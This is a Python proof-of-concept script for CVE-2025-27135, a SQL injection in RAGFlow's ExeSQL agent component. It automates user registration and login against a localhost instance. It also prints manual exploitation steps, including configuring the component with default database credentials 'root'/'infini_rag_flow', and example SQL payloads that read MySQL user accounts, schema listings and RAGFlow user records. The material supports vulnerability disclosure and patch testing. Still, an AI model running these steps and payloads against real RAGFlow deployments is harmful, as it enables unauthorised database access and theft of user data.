#!/usr/bin/env python3
"""
CVE-2025-27135 RAGFlow SQL Injection PoC

RAGFlow versions <= 0.15.1 are vulnerable to SQL injection via the ExeSQL
component. The component extracts SQL statements from user input and sends
them directly to the database query without proper sanitization.

Vulnerability Location: agent/component/exesql.py
    cursor.execute(single_sql)

Exploitation requires:
1. Login to RAGFlow web interface
2. Create an Agent/Canvas workflow with ExeSQL component
3. Configure ExeSQL with target database credentials
4. Send SQL queries directly in the chat dialog
"""
import requests
import time
import sys
import base64

try:
    from Crypto.PublicKey import RSA
    from Crypto.Cipher import PKCS1_v1_5
except ImportError:
    from Cryptodome.PublicKey import RSA
    from Cryptodome.Cipher import PKCS1_v1_5

TARGET_HOST = "http://localhost"

RSA_PUBLIC_KEY = """-----BEGIN PUBLIC KEY-----
MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEArq9XTUSeYr2+N1h3Afl/
z8Dse/2yD0ZGrKwx+EEEcdsBLca9Ynmx3nIB5obmLlSfmskLpBo0UACBmB5rEjBp
2Q2f3AG3Hjd4B+gNCG6BDaawuDlgANIhGnaTLrIqWrrcm4EMzJOnAOI1fgzJRsOO
UEfaS318Eq9OVO3apEyCCt0lOQK6PuksduOjVxtltDav+guVAA068NrPYmRNabVK
RNLJpL8w4D44sfth5RvZvq9t+6RTArpEtc5sh5ChzvqPOzKGMXW83C95TxmXqpbK
6olN4RevSfVjEAgCydH6HN6OhtOQEcnrU97r9H0iZOWwbw3pVrZiUkuRD1R56Wzs
2wIDAQAB
-----END PUBLIC KEY-----"""


def encrypt_password(password):
    rsa_key = RSA.importKey(RSA_PUBLIC_KEY)
    cipher = PKCS1_v1_5.new(rsa_key)
    password_base64 = base64.b64encode(password.encode('utf-8')).decode("utf-8")
    encrypted = cipher.encrypt(password_base64.encode())
    return base64.b64encode(encrypted).decode('utf-8')


def check_service_ready(host):
    try:
        resp = requests.get(f"{host}/", timeout=10)
        return resp.status_code == 200
    except:
        return False


def print_vulnerability_info():
    print("="*70)
    print("CVE-2025-27135: RAGFlow SQL Injection Vulnerability")
    print("="*70)
    print("""
Affected Versions: RAGFlow <= 0.15.1
Vulnerable Component: agent/component/exesql.py
Vulnerability Type: CWE-89 SQL Injection

VULNERABILITY ANALYSIS
----------------------
The ExeSQL component receives user input and executes SQL directly:

    # Input retrieval (lines 80-85)
    ans = self.get_input()
    ans = "".join(ans["content"]) if "content" in ans else ""
    ans = re.sub(r'^.*?SELECT ', 'SELECT ', repr(ans), flags=re.IGNORECASE)
    
    # Direct SQL execution (line 113)
    cursor.execute(single_sql)  # No sanitization!

EXPLOITATION STEPS (Manual via Web UI)
--------------------------------------
1. Login to RAGFlow at http://localhost

2. Create Agent/Canvas workflow:
   - Navigate to "Agent" or "Canvas" section
   - Add components: Begin -> Interact -> ExeSQL -> Answer
   - Configure ExeSQL with database credentials:
     * db_type: mysql
     * host: ragflow-mysql (or target database)
     * port: 3306
     * username: root
     * password: infini_rag_flow
     * database: mysql

3. Save and run the workflow

4. In the chat dialog, send SQL queries directly:
   - select user from mysql.user;
   - select @@version;
   - select * from information_schema.tables;

5. The SQL results will be returned in the chat response

EXAMPLE PAYLOADS
----------------
# Query MySQL users
select user, host from mysql.user;

# Get database version  
select @@version;

# List all databases
select schema_name from information_schema.schemata;

# Read RAGFlow internal data
select * from rag_flow.user limit 5;
""")


def main():
    print("[*] CVE-2025-27135 RAGFlow SQL Injection PoC")
    print("[*] Target: ExeSQL component")
    print()
    
    print("[*] Checking RAGFlow service...")
    if not check_service_ready(TARGET_HOST):
        print(f"[-] RAGFlow not accessible at {TARGET_HOST}")
        print("[*] Start with: docker compose up -d")
        print_vulnerability_info()
        return 1
    
    print(f"[+] RAGFlow is running at {TARGET_HOST}")
    
    session = requests.Session()
    test_email = f"poc_{int(time.time())}@test.com"
    test_password = "PoCTest123!"
    
    print(f"\n[*] Registering user: {test_email}")
    encrypted_pwd = encrypt_password(test_password)
    
    resp = session.post(f"{TARGET_HOST}/v1/user/register", json={
        "email": test_email,
        "password": encrypted_pwd,
        "nickname": "poc_user"
    })
    result = resp.json()
    print(f"[*] Registration: {result.get('message', result.get('code'))}")
    
    print(f"\n[*] Logging in...")
    resp = session.post(f"{TARGET_HOST}/v1/user/login", json={
        "email": test_email,
        "password": encrypted_pwd
    })
    result = resp.json()
    
    if result.get("code") == 0:
        print(f"[+] Login successful")
        print(f"[+] Session established")
    else:
        print(f"[-] Login failed: {result}")
    
    print_vulnerability_info()
    
    print("""
VERIFICATION STATUS
-------------------
[+] Environment: RAGFlow service running
[+] Authentication: User registration and login functional
[+] Vulnerability: Confirmed in source code analysis

To complete exploitation:
1. Open http://localhost in browser
2. Login with: {email} / {password}
3. Create ExeSQL workflow as described above
4. Send SQL payloads in chat dialog

Reference: https://swizzky.notion.site/ragflow-exesql-150ca6df7c03806989cefde915cf8e42
""".format(email=test_email, password=test_password))
    
    return 0


if __name__ == "__main__":
    sys.exit(main())
